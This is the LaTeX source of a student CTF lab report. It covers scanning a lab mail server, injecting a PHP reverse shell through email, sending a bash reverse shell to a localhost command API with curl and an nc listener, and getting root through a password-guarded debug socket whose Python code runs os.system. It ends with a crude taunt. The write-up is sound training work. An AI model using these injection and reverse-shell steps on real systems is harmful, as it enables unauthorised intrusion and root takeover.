\documentclass[titlepage]{article} %{scrartcl}
\usepackage[english]{babel}


\usepackage{amsmath, amssymb}

\usepackage{array}  % for the tables

\usepackage{nameref}  % for referencing with name

\usepackage{hyperref}  % for hyperlinks

\usepackage{mathrsfs}

\usepackage{graphicx}  % for the images

\usepackage{xcolor, colortbl, color}

\usepackage{minted} % code highlighting

\usepackage{gensymb} % for \degree

\usepackage{pgfplots}
\pgfplotsset{compat=1.18}

\usepackage{tabto}

\usepackage{lipsum} % for the lipsum text

\usepackage{listings}

\usepackage{textcomp} % permille

\usepackage{pdfpages} % for including pdfs

% \usepackage{fancyhdr} % for header/foot
% \pagestyle{fancy}
% \fancyhf{}
% \renewcommand{\headrulewidth}{0pt}
% \fancyhead[L]{\includegraphics[height=1cm]{img/HSLU\_logo.png}}
% \fancyhead[R]{\textbf{Computer Science}}
% \fancyfoot[L]{David Jäggli}
% \fancyfoot[R]{\thepage}
% \setlength{\headheight}{33pt}

% \usepackage[backend=biber, style=authoryear-comp]{biblatex}
% \addbibresource{AArch64_encoder.bib}

% Define custom colors
\definecolor{codegreen}{rgb}{0,0.6,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\definecolor{backcolour}{rgb}{0.95,0.95,0.92}

\definecolor{lightgray}{gray}{0.95}

% Set minted options globally
\setminted{
    bgcolor=lightgray, % Background color
    frame=none,        % No box around the code
    linenos=false,     % No line numbers
  	breaklines
	frame=lines
  	% bgcolor=codegray,
  	% numbersep=5pt,
	% framesep=2
}


\setminted{
}



\newcolumntype{P}[1]{>{\centering\arraybackslash}p{#1}}

\usetikzlibrary{arrows}

\definecolor{Gray}{gray}{0.85}

\setlength{\parindent}{0cm}

% hyperlinks
\hypersetup{
    colorlinks,
    citecolor=black,
    filecolor=black,
    linkcolor=black,
    urlcolor=blue
}

% for margins
\usepackage[a4paper,
            left=2.5cm,right=2.5cm,top=2cm,bottom=2.5cm,%
            footskip=.3in]{geometry}
\usepackage[T1]{fontenc}


\newcommand{\revshellurl}{\href{https://revshells.com}{revshells.com}}



\author{Elias Gmünder, Timo Gafner, David Jäggli}

\title{Cyber 2 - CTF3 Report}


% ---------- Begin Main Document ----------- %


\begin{document}

\maketitle
\makeatletter


\section{CTF3 Report}%
\label{sec:CTF3 Report}


\subsection{Initial information}%
\label{sub:Initial information}

There was a certain command givin a hint to the next server: (where did we find it?)

\begin{minted}[frame=none]{powershell}
Get-SCPFolder -ComputerName 'Riften.robstargames.com' -Credential $credential -LocalFolder 'C:\backups\' -RemoteFolder '/var/mail/bugs'
\end{minted}

The corresponding IP to the domain is: 192.168.22.65


\subsection{Recon}
\label{ssub:recon}


Do simple nmap sync-scan:

\begin{minted}{bash}
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-07 16:02 CET
Nmap scan report for Riften.robstargames.com (192.168.22.65)
Host is up (0.00061s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE  SERVICE
22/tcp   open   ssh
25/tcp   open   smtp
80/tcp   open   http
443/tcp  closed https
3000/tcp open   ppp

Nmap done: 1 IP address (1 host up) scanned in 4.77 seconds
\end{minted}

\subsection{Other info}
\label{sub:Other info}

Page on port 3000 takes commands, only localhost allowed.


\subsection{Mail service}
\label{sub:Mail service}

On the main page it says that the e-mails sent to bugs@robstargames.com are being displayed here. And since the port 25 is open, an attempt to send an E-Mail was made. 
The CLI-tool \texttt{sendemail} should do the task.\\

An initial test was made with the following command:

\begin{minted}[frame=none]{bash}
sendemail -f 69420@example.com -t bugs@robstargames.com -u 'Subject' -m 'YadaYada' -s 192.168.22.65 -o tls=no
\end{minted}

Note that the \texttt{-o tls=no} is necessary, otherwise there is a certificate error.\\
Message "YadaYada" is displayed on frontpage.\\

Next test was if php code gets interpreted, this was made with a simple PHP-String with an echo command in it. And indeed only the echo-string was displayed, not the whole message. \\ 

Get revshell from \revshellurl (PentestMonkey version) with port 9000

\begin{minted}{bash}
sendemail -f 69420@example.com -t bugs@robstargames.com -u 'Subject' -m '$(cat revshell.php)' -s 192.168.22.65 -o tls=no
nc -lvnp 9000
\end{minted}

Next visit front-page -> easy revshell. \\

Since webshell code is in user space -> must probably have users rights -> exploit webshell to get to user.\\
Now from within revshell curl request to localhost:3000 with the content being a bash revshell (again generated with \revshellurl \\
Validated must be 1 (seen in JS-file on command site)\\


The commands must be executed in two different terminals:

\begin{minted}{bash}
nc -lvnp 9001
curl localhost:3000/api/v1/command -X POST -d "cmd=<jajaja>&validated=1"
\end{minted}

debupasswort ain't working on anything

linpeas says writable path vuln, but no suitable binary found\\
SSH-shell is rbash -> sucks\\


\newpage
Further linpeas output analyzed, found /opt/cloak.py \\
\textit{maybe delete whole file display on shrink on essential lines, i don't know}

\begin{minted}[highlightlines={10-12,32-45}]{python}
#!/usr/bin/env python3

import socket
import os
import hashlib

if os.path.exists("/run/cloak.sock"):
    os.remove("/run/cloak.sock")

socket = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
socket.bind("/run/cloak.sock")
os.system("chmod o+w /run/cloak.sock")

while True:
    socket.listen(1) 
    connection, address = socket.accept()

    welcome = "Welcome to the debug socket!\nPlease provide your password: "
    connection.sendall(welcome.encode())

    data = connection.recv(1024)

    # for security reasons I have secured access to the debug socket with password
    hash = "e0dc3deda28c0a78ddb6ed718f9d6332378df1b1ec4654fa2177fbcf773fd9c1"

    if(hashlib.sha256(data.decode().strip().encode()).hexdigest() == hash):
        print("success")
        response = "password accepted!\n"
        connection.sendall(response.encode())

        try:
            while True:
                response = "enter command: "
                connection.sendall(response.encode())
                data = connection.recv(1024)

                if data:
                    returncode = os.system(data)
                    if(returncode == 0):
                        response = "command executed!\n"
                        connection.sendall(response.encode())
                    else:
                        response = "an error has occured..\n"
                        connection.sendall(response.encode())
                        connection.close()
        # sometimes this crashes but I have set up a service that should restart it
        except:
            print("nothing to see here..")

    # just in case..
    else:
        print("invalid password")
        response = "invalid password, goodbye!\n"
        connection.sendall(response.encode())
        connection.close()
\end{minted}

\newpage
it says debug socket, hint to use debugpassword.txt -> it works. \\ 
socket and file is owned by root -> execute commands as root. \\

Read root flag:

\begin{minted}{bash}
cat /root/root.txt > /home/stormcloak/out
command executed!
enter command: asdf
asdf
an error has occured..
stormcloak@Riften:~$ cat out
cat out
Your flag is: 8e9e8455f6840e45e8c12798e7a47bf2 
\end{minted}

Get owned bitch.




\end{document}
